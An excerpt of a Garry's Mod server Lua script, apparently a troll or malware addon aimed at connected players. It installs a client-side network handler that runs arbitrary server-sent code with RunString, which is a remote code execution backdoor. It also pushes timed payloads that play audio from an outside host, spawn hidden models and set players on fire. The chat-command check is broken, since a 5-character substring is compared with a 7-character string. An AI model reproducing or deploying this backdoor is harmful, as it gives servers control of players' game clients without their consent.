...
function lol:SetupPlayer( pPlayer )
    pPlayer:SendLua( "net.Receive(\"spooky\", function() RunString(net.ReadString()) end)" )
end
...
hook.Add( "PlayerSay", "1337command", function( pSender, strText, bTeamChat )
    if strText:sub( 1, 5 ) == "/hentai" then
        pSender:Ignite( 1e9 )
...
lol:PushAction( 0, function( pPlayer )
    lol:SendLua( pPlayer, ([=[
        sound.PlayURL( "http://jajaja99.x10host.com/greg.mp3", "", function()end )
...
lol:PushAction( 10, function( pPlayer )
    ...
    lol:SendLua( pPlayer, [[
        ...
        local mdl = ClientsideModel( "models/headcrabclassic.mdl", RENDERGROUP_BOTH )
        mdl:SetNoDraw( true )
...
lol:PushAction( 175, function( pPlayer )
    lol:SendLua( pPlayer, [[
        ...
        local sounds = {}
        for i = 1, 4 do
            sound.PlayURL( "", "noblock noplay", function( pChan )
